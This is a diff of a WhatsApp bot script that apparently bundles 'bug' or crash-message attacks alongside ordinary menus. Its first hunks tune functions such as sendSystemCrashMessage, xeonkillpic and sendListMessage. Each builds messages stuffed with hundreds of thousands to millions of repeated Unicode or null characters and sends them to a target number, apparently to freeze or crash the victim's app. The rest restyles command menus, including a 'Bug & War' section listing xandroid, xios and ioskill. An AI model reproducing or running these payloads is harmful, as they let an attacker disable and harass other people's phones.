@@ -1208,7 +1208,7 @@ message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `🌟STAR KING 🌟STAR KING 🌟STAR KING`+"ꦾ".repeat(1000000),
+    "caption": `🌟STAR KING 🌟STAR KING 🌟STAR KING`+"ꦾ".repeat(50000),
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
@@ -1233,7 +1233,7 @@ async function xeonkillpic(target, kuwoted) {
         text: "›          #🌟STAR KING"
       },
       nativeFlowMessage: {
-        messageParamsJson: " ".repeat(10000000)
+        messageParamsJson: " ".repeat(1000000)
       }
     }
 }), { userJid: target, quoted: kuwoted });
@@ -1272,7 +1272,7 @@ async function listxeonfck(target, kuwoted) {
         'ephemeralSettingTimestamp': "1679959486",
         'entryPointConversionSource': "global_search_new_chat",
         'entryPointConversionApp': "whatsapp",
-        'entryPointConversionDelaySeconds': 5,
+        'entryPointConversionDelaySeconds': 9,
         'disappearingMode': {
           'initiator': "INITIATED_BY_ME"
         }
@@ -1289,7 +1289,7 @@ await XeonBotInc.relayMessage(target, etc.message, { participant: { jid: target 
 async function sendRepeatedMessages(jid, count) {
   for (let i = 0; i < count; i++) {
    XeonBotInc.sendMessage(recipientJid, {
-      'text': ''.repeat(1000000)
+      'text': ''.repeat(50000)
     }, {
       'participant': {
         'jid': jid
@@ -1325,9 +1325,9 @@ async function sendViewOnceMessages(jid, count) {
             'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
               'buttons': [{
                 'name': "cta_url",
-                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(1000000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
+                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
               }],
-              'messageParamsJson': "\0".repeat(1000000)
+              'messageParamsJson': "\0".repeat(100000)
             })
           })
         }
@@ -1359,7 +1359,7 @@ async function sendSystemCrashMessage(jid) {
               'name': 'cta_url',
               'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
             }],
-            'messageParamsJson': "\0".repeat(10000000)
+            'messageParamsJson': "\0".repeat(1000000)
           }
         }
       }
@@ -1377,7 +1377,7 @@ async function sendSystemCrashMessage(jid) {
 async function sendListMessage(jid) {
   var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
     'listMessage': {
-      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(92000000),
+      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
       'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
       'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
       'buttonText': null,
@@ -1398,11 +1398,11 @@ async function sendListMessage(jid) {
     },
     'footer': "lol",
     'contextInfo': {
-      'expiration': 6000000,
+      'expiration': 600000,
       'ephemeralSettingTimestamp': "1679959486",
       'entryPointConversionSource': "global_search_new_chat",
       'entryPointConversionApp': "whatsapp",
-      'entryPointConversionDelaySeconds': 5,
+      'entryPointConversionDelaySeconds': 9,
       'disappearingMode': {
         'initiator': "INITIATED_BY_ME"
       }
@@ -1431,7 +1431,7 @@ async function sendLiveLocationMessage(jid) {
         'liveLocationMessage': {
           'degreesLatitude': 'p',
           'degreesLongitude': 'p',
-          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(1000000),
+          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
           'sequenceNumber': '0',
           'jpegThumbnail': ''
         }
@@ -1457,7 +1457,7 @@ async function sendExtendedTextMessage(jid) {
         'stanzaId': jid,
         'participant': jid,
         'quotedMessage': {
-          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(1000000)
+          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
         },
         'disappearingMode': {
           'initiator': "CHANGED_IN_CHAT",
@@ -16785,19 +16785,19 @@ break
             const a = db.users[sender]
             const me = m.sender
 			const xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *USER INFO* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *USER INFO* 」✿
 ├ *Name* : ${m.pushName ? m.pushName : 'No name'}
 ├ *Number* : +${me.split('@')[0]}
 ├ *Id* : @${m.sender.split('@')[0]}
 ├ *User* : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
 ├ *Limit* : ${isVip ? 'VIP' : global.db.users[m.sender].limit }
 ├ *Money* : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
-╚═══*.·:·.☽✧
+╰─┬────✿
 ╭─┴─✿「 *BOT INFO* 」✿
 ├ *Speed* : ${latensie.toFixed(4)} miliseconds
 ├ *Runtime* : ${runtime(process.uptime())}
@@ -16810,13 +16810,13 @@ break
 ├ *Total Hit* : ${global.db.settings[botNumber].totalhit} Hit
 ├ *Total Chat* : ${Object.keys(global.db.groups).length} Chat/Gc
 ├ *Prefix* :「 ${xprefix} 」
-╚═══*.·:·.☽✧
+╰─┬────✿
 ╭─┴─✿「 *TIME* 」✿
 ├ *Date* : ${xdate}
 ├ *Day* : ${xday}
 ├ *Time* : ${xtime}
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *MENU* 」✿
+╰─┬────✿
+╭─┴✿「 *MENU* 」✿
 │${setv} ${prefix}allmenu
 │${setv} ${prefix}searchmenu
 │${setv} ${prefix}downloadmenu
@@ -16838,7 +16838,7 @@ break
 │${setv} ${prefix}stalkermenu
 │${setv} ${prefix}bugmenu
 │${setv} ${prefix}othermenu
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -17267,17 +17267,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'allmenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Owner* 」✿
+╰─┬────✿
+╭─┴✿「 *Owner* 」✿
 │${setv} ${prefix}addbadword 👑
 │${setv} ${prefix}delbadword 👑
 │${setv} ${prefix}autoread 👑
@@ -17356,8 +17356,8 @@ let xmenu_oh = `
 │${setv} $ 👑
 │${setv} > 👑
 │${setv} < 👑
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Group* 」✿
+╰─┬────✿
+╭─┴✿「 *Group* 」✿
 │${setv} ${prefix}antibot 🫂
 │${setv} ${prefix}antiviewonce 🫂
 │${setv} ${prefix}readviewonce 🫂
@@ -17415,8 +17415,8 @@ let xmenu_oh = `
 │${setv} ${prefix}nsfw 🫂
 │${setv} ${prefix}react 🫂
 │${setv} ${prefix}getjoinrequest 🫂
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Search* 」✿
+╰─┬────✿
+╭─┴✿「 *Search* 」✿
 │${setv} ${prefix}google ❄️
 │${setv} ${prefix}wikipedia ❄️
 │${setv} ${prefix}ytsearch ❄️
@@ -17429,8 +17429,8 @@ let xmenu_oh = `
 │${setv} ${prefix}friend ❄️
 │${setv} ${prefix}lyrics ❄️
 │${setv} ${prefix}pixiv ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Download* 」✿
+╰─┬────✿
+╭─┴✿「 *Download* 」✿
 │${setv} ${prefix}xnxxdl ❄️
 │${setv} ${prefix}xvideodl ❄️
 │${setv} ${prefix}itunes ❄️
@@ -17457,8 +17457,8 @@ let xmenu_oh = `
 │${setv} ${prefix}pinterest ❄️
 │${setv} ${prefix}ringtone ❄️
 │${setv} ${prefix}autodownload 👑
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Tool Menu* 」✿
+╰─┬────✿
+╭─┴✿「 *Tool Menu* 」✿
 │${setv} ${prefix}obfuscate ❄️
 │${setv} ${prefix}styletext ❄️
 │${setv} ${prefix}fliptext ❄️
@@ -17502,8 +17502,8 @@ let xmenu_oh = `
 │${setv} ${prefix}get ❄️
 │${setv} ${prefix}tourl ❄️
 │${setv} ${prefix}write ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *List Menu* 」✿
+╰─┬────✿
+╭─┴✿「 *List Menu* 」✿
 │${setv} ${prefix}listprem ❄️
 │${setv} ${prefix}listowner ❄️
 │${setv} ${prefix}liststicker ❄️
@@ -17516,8 +17516,8 @@ let xmenu_oh = `
 │${setv} ${prefix}listbadword ❄️
 │${setv} ${prefix}listpc ❄️
 │${setv} ${prefix}listgc ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Random Photo* 」✿
+╰─┬────✿
+╭─┴✿「 *Random Photo* 」✿
 │${setv} ${prefix}aesthetic ❄️
 │${setv} ${prefix}coffee ❄️
 │${setv} ${prefix}wikimedia ❄️
@@ -17575,8 +17575,8 @@ let xmenu_oh = `
 │${setv} ${prefix}malay ❄️
 │${setv} ${prefix}thai ❄️
 │${setv} ${prefix}vietnamese ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Random Video* 」✿
+╰─┬────✿
+╭─┴✿「 *Random Video* 」✿
 │${setv} ${prefix}tiktokgirl ❄️
 │${setv} ${prefix}tiktoknukthy ❄️
 │${setv} ${prefix}tiktokkayes ❄️
@@ -17585,14 +17585,14 @@ let xmenu_oh = `
 │${setv} ${prefix}tiktokghea ❄️
 │${setv} ${prefix}tiktoksantuy ❄️
 │${setv} ${prefix}tiktokbocil ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Stalker* 」✿
+╰─┬────✿
+╭─┴✿「 *Stalker* 」✿
 │${setv} ${prefix}tiktokstalk ❄️
 │${setv} ${prefix}mlstalk ❄️
 │${setv} ${prefix}npmstalk ❄️
 │${setv} ${prefix}ghstalk ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *OpenAI* 」✿
+╰─┬────✿
+╭─┴✿「 *OpenAI* 」✿
 │${setv} ${prefix}blackboxai ❄️
 │${setv} ${prefix}travel-assistant ❄️
 │${setv} ${prefix}guru-ai ❄️
@@ -17612,8 +17612,8 @@ let xmenu_oh = `
 │${setv} ${prefix}dalle ❄️
 │${setv} ${prefix}ai ❄️
 │${setv} ${prefix}remini ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Game* 」✿
+╰─┬────✿
+╭─┴✿「 *Game* 」✿
 │${setv} ${prefix}truth ❄️
 │${setv} ${prefix}dare ❄️
 │${setv} ${prefix}suit ❄️
@@ -17628,8 +17628,8 @@ let xmenu_oh = `
 │${setv} ${prefix} claim ❄️
 │${setv} ${prefix} tmoney ❄️
 │${setv} ${prefix} tflimit ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Fun* 」✿
+╰─┬────✿
+╭─┴✿「 *Fun* 」✿
 │${setv} ${prefix}define ❄️
 │${setv} ${prefix}readmore ❄️
 │${setv} ${prefix}fact ❄️
@@ -17694,8 +17694,8 @@ let xmenu_oh = `
 │${setv} ${prefix}feed ❄️
 │${setv} ${prefix}checkme ❄️
 │${setv} ${prefix}sound1 - sound161 ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Sticker* 」✿
+╰─┬────✿
+╭─┴✿「 *Sticker* 」✿
 │${setv} ${prefix}goose ❄️
 │${setv} ${prefix}woof ❄️
 │${setv} ${prefix}8ball ❄️
@@ -17703,8 +17703,8 @@ let xmenu_oh = `
 │${setv} ${prefix}meow ❄️
 │${setv} ${prefix}gura ❄️
 │${setv} ${prefix}telestick ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Anime* 」✿
+╰─┬────✿
+╭─┴✿「 *Anime* 」✿
 │${setv} ${prefix}stickhandhold ❄️
 │${setv} ${prefix}stickshinobu ❄️
 │${setv} ${prefix}stickcuddle ❄️
@@ -17840,8 +17840,8 @@ let xmenu_oh = `
 │${setv} ${prefix}shinobu ❄️
 │${setv} ${prefix}fox_girl ❄️
 │${setv} ${prefix}gecg ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Anime NSFW* 」✿
+╰─┬────✿
+╭─┴✿「 *Anime NSFW* 」✿
 │${setv} ${prefix}hentai ❄️
 │${setv} ${prefix}gifblowjob ❄️
 │${setv} ${prefix}hentaivid ❄️
@@ -17856,8 +17856,8 @@ let xmenu_oh = `
 │${setv} ${prefix}pussy ❄️
 │${setv} ${prefix}yuri ❄️
 │${setv} ${prefix}zettai ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Database* 」✿
+╰─┬────✿
+╭─┴✿「 *Database* 」✿
 │${setv} ${prefix}setcmd 👑
 │${setv} ${prefix}delcmd 👑
 │${setv} ${prefix}listcmd ❄️
@@ -17866,20 +17866,20 @@ let xmenu_oh = `
 │${setv} ${prefix}delmsg 👑
 │${setv} ${prefix}getmsg ❄️
 │${setv} ${prefix}listmsg ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Store* 」✿
+╰─┬────✿
+╭─┴✿「 *Store* 」✿
 │${setv} ${prefix}list ❄️
 │${setv} ${prefix}store ❄️
 │${setv} ${prefix}shop ❄️
 │${setv} ${prefix}addlist 👑
 │${setv} ${prefix}dellist 👑
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Religon* 」✿
+╰─┬────✿
+╭─┴✿「 *Religon* 」✿
 │${setv} ${prefix}bible ❄️
 │${setv} ${prefix}quran ❄️
 │${setv} ${prefix}gita ❄️
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Bug & War* 」✿
+╰─┬────✿
+╭─┴✿「 *Bug & War* 」✿
 │${setv} ${prefix}xandroid 👑
 │${setv} ${prefix}xandroid2 👑
 │${setv} ${prefix}xios 👑
@@ -17890,8 +17890,8 @@ let xmenu_oh = `
 │${setv} ${prefix}ioskill 👑
 │${setv} ${prefix}onekill 👑
 │${setv} ${prefix}xgcmem 👑
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Other* 」✿
+╰─┬────✿
+╭─┴✿「 *Other* 」✿
 │${setv} ${prefix}update ❄️
 │${setv} ${prefix}ping ❄️
 │${setv} ${prefix}menu ❄️
@@ -17908,7 +17908,7 @@ let xmenu_oh = `
 │${setv} ${prefix}q ❄️
 │${setv} ${prefix}inspect ❄️
 │${setv} ${prefix}tagme ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -18259,17 +18259,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'ownermenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Owner* 」✿
+╰─┬────✿
+╭─┴✿「 *Owner* 」✿
 │${setv} ${prefix}addbadword 👑
 │${setv} ${prefix}delbadword 👑
 │${setv} ${prefix}autoread 👑
@@ -18348,7 +18348,7 @@ let xmenu_oh = `
 │${setv} $ 👑
 │${setv} > 👑
 │${setv} < 👑
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -18699,17 +18699,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'groupmenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Group* 」✿
+╰─┬────✿
+╭─┴✿「 *Group* 」✿
 │${setv} ${prefix}antibot 🫂
 │${setv} ${prefix}antiviewonce 🫂
 │${setv} ${prefix}readviewonce 🫂
@@ -18767,7 +18767,7 @@ let xmenu_oh = `
 │${setv} ${prefix}nsfw 🫂
 │${setv} ${prefix}react 🫂
 │${setv} ${prefix}getjoinrequest 🫂
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -19118,17 +19118,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'searchmenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Search* 」✿
+╰─┬────✿
+╭─┴✿「 *Search* 」✿
 │${setv} ${prefix}google ❄️
 │${setv} ${prefix}wikipedia ❄️
 │${setv} ${prefix}ytsearch ❄️
@@ -19141,7 +19141,7 @@ let xmenu_oh = `
 │${setv} ${prefix}friend ❄️
 │${setv} ${prefix}lyrics ❄️
 │${setv} ${prefix}pixiv ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -19492,17 +19492,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'downloadmenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Download* 」✿
+╰─┬────✿
+╭─┴✿「 *Download* 」✿
 │${setv} ${prefix}xnxxdl ❄️
 │${setv} ${prefix}xvideodl ❄️
 │${setv} ${prefix}itunes ❄️
@@ -19529,7 +19529,7 @@ let xmenu_oh = `
 │${setv} ${prefix}pinterest ❄️
 │${setv} ${prefix}ringtone ❄️
 │${setv} ${prefix}autodownload 👑
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -19880,17 +19880,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'toolmenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Tool Menu* 」✿
+╰─┬────✿
+╭─┴✿「 *Tool Menu* 」✿
 │${setv} ${prefix}obfuscate ❄️
 │${setv} ${prefix}styletext ❄️
 │${setv} ${prefix}fliptext ❄️
@@ -19934,7 +19934,7 @@ let xmenu_oh = `
 │${setv} ${prefix}get ❄️
 │${setv} ${prefix}tourl ❄️
 │${setv} ${prefix}write ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -20285,17 +20285,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'listmenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *List Menu* 」✿
+╰─┬────✿
+╭─┴✿「 *List Menu* 」✿
 │${setv} ${prefix}listprem ❄️
 │${setv} ${prefix}listowner ❄️
 │${setv} ${prefix}liststicker ❄️
@@ -20308,7 +20308,7 @@ let xmenu_oh = `
 │${setv} ${prefix}listbadword ❄️
 │${setv} ${prefix}listpc ❄️
 │${setv} ${prefix}listgc ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -20659,17 +20659,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'randomphotomenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Random Photo* 」✿
+╰─┬────✿
+╭─┴✿「 *Random Photo* 」✿
 │${setv} ${prefix}aesthetic ❄️
 │${setv} ${prefix}coffee ❄️
 │${setv} ${prefix}wikimedia ❄️
@@ -20727,7 +20727,7 @@ let xmenu_oh = `
 │${setv} ${prefix}malay ❄️
 │${setv} ${prefix}thai ❄️
 │${setv} ${prefix}vietnamese ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -21078,17 +21078,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'randomvideomenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Random Video* 」✿
+╰─┬────✿
+╭─┴✿「 *Random Video* 」✿
 │${setv} ${prefix}tiktokgirl ❄️
 │${setv} ${prefix}tiktoknukthy ❄️
 │${setv} ${prefix}tiktokkayes ❄️
@@ -21097,7 +21097,7 @@ let xmenu_oh = `
 │${setv} ${prefix}tiktokghea ❄️
 │${setv} ${prefix}tiktoksantuy ❄️
 │${setv} ${prefix}tiktokbocil ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -21448,22 +21448,22 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'stalkermenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Stalker* 」✿
+╰─┬────✿
+╭─┴✿「 *Stalker* 」✿
 │${setv} ${prefix}tiktokstalk ❄️
 │${setv} ${prefix}mlstalk ❄️
 │${setv} ${prefix}npmstalk ❄️
 │${setv} ${prefix}ghstalk ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -21814,17 +21814,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'aimenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *OpenAI* 」✿
+╰─┬────✿
+╭─┴✿「 *OpenAI* 」✿
 │${setv} ${prefix}blackboxai ❄️
 │${setv} ${prefix}travel-assistant ❄️
 │${setv} ${prefix}guru-ai ❄️
@@ -21844,7 +21844,7 @@ let xmenu_oh = `
 │${setv} ${prefix}dalle ❄️
 │${setv} ${prefix}ai ❄️
 │${setv} ${prefix}remini ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -22195,17 +22195,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'gamemenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Game* 」✿
+╰─┬────✿
+╭─┴✿「 *Game* 」✿
 │${setv} ${prefix}truth ❄️
 │${setv} ${prefix}dare ❄️
 │${setv} ${prefix}suit ❄️
@@ -22220,7 +22220,7 @@ let xmenu_oh = `
 │${setv} ${prefix} claim ❄️
 │${setv} ${prefix} tmoney ❄️
